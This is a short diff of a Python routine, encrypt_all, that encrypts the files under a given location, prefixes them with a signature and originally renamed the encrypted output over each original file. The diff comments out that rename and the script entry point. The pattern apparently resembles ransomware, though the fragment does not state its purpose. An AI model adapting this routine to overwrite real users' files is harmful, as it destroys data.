@@ -122,8 +122,9 @@ def encrypt_all(location):
                     content = cipher.encrypt(''.join(input.readlines()))
                     content = '{0}{1}'.format(SIGNATURE, content)
                     output.write(content)
-            os.rename(enc_name, orig_name)
+            #os.rename(enc_name, orig_name)
 
 
-if __name__ == '__main__':
-    encrypt_all(sys.argv[1])
+#if __name__ == '__main__':
+#    encrypt_all(sys.argv[1])
+# commented to be used as a script
